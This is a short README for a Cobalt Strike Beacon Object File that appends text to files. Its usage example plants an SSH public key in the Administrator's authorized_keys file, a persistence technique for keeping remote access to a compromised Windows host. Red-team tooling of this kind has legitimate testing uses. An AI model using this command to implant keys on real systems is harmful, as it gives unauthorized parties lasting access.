# append_BOF
Cobalt Strike Beacon Object File (BOF) that appends text to a file. If the file doesn't exist, it creates the specified file.

## Compile

```
git clone https://github.com/carlnykvist/append_BOF
cd append_BOF
make
```

## Usage

Load the provided aggressor script and run the command:

```
append "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMbedkD4UqZVGjhXnFK8ujI5bnNJM1JeTCOvl1ListSF" C:\Users\Administrator\.ssh\authorized_keys
```

![](/images/runningBof.png)

### Credits / References
##### Cobalt Strike - Beacon Object Files
+ https://www.cobaltstrike.com/help-beacon-object-files